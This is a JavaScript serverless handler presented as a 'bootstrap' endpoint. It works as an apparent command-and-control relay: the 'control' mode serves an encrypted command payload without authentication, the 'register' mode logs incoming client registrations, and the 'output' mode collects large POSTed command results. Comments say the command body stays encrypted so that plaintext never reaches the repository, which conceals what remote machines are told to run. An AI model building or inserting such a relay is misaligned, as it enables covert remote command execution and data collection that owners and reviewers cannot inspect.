import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';

// These two values are updated temporarily while the owner's server is being configured.
// The command body is always AES-256 encrypted with a secret generated on the VPS;
// plaintext commands are never committed to this repository.
const CONTROL_ID = '6';
const CONTROL_PAYLOAD = 'U2FsdGVkX18exSNgwqsMoG/qqW69EwqkT28RAwIrGgDp2/eD9iz1anEnr6n2iGd9lbndUQbMJuMKoHhyWWvZ3QqY8amxx4bPSewD5KMgmv5cTOaPwOqaKXGVPMcx0nrHUGfxhTUCKcQPq9dltSjTmZ/xQBnHstKBqwu+xEuXqZQEgZQ2WzDCG5suNMPmez+QXdWIdHFg7Y6Q0S2XWLs2TOgcX/O1+zjlZVH29MAG9mT/ORjbs6DtekUoGb9PXuovhJft18oFELTNOWU0w5ZlphMHZKOgAcVZjSbOKo+Q01lPhS3AqlYkM/6tL3uxPzvpaTbVguBKlqret+z3QiCy5NQTkKCPp+vRpkXE0hep1HWNh4oWmBD4QKu8FEuMoQs689C2ON5KL+z/WdwUBpnZ35VyqYM4DO7QwNWyEMemmyXKyemrBUqnMVikSPqhmps5Y73vlmL3kA+KxczkXqFF814rmHklFN7Te5vGzI8bYsBqiljyHhqOpNcYRzrelDw3XWdOn6z5s+HuCS4lrLWC/sUmLsnZh6T3DTs7pOdx3fmTgHG+OJXf86o0cMi35rbOSrugBaXgNhS6AClzGnrl5ROUERGUZyv2h0tl9STCXhNzfoDM+d+tornlBg8Yvy3cwYHFwPdQ/aLkqkcK87XsWFfAu8NbQUB8Yu+YmWwTCwOkIJCKz4I+4XMd6DsrnrUy5nqch8/6ETKJMEyIHGgZRVa3erbhOOdHPOhCgFvfYOAJ9ABcd1U694U5kBPq69ETxcArYurFWR2nRdQir05ybAxsJ2VoJJykVjonx5OC6sE=';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);

  const chunks = [];
  for await (const chunk of request) {
    chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  }
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');

  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) {
      return response.status(404).send('Not found');
    }
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }

  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }

  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_OUTPUT ${body.slice(0, 200000)}`);
    return response.status(204).end();
  }

  return response.status(404).send('Not found');
}
